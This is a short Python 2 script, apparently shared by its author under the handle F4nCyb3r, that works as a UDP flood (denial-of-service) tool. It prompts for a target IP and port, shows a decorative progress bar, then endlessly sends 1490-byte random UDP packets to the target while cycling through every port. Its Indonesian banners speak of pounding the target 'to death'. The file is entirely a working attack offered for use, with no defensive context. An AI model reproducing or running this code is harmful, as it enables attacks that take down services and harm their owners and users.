import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet Pengetahuan Adalah Kekuatan")
print
print "Author   : F4nCyb3r"
print "You Tube : https://www.youtube.com/channel/UCS9uQl65oBpuYH5dmX4s_yw"
print "github   : https://github.com/F4nCyb3r"
print
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet SAATNYA BERTUMBUK")
print "[                    ] 0% "
time.sleep(1)
print "[=====               ] 25%"
time.sleep(2)
print "[==========          ] 50%"
time.sleep(3)
print "[===============     ] 75%"
time.sleep(4)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s tumbuk %s sampai mati port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

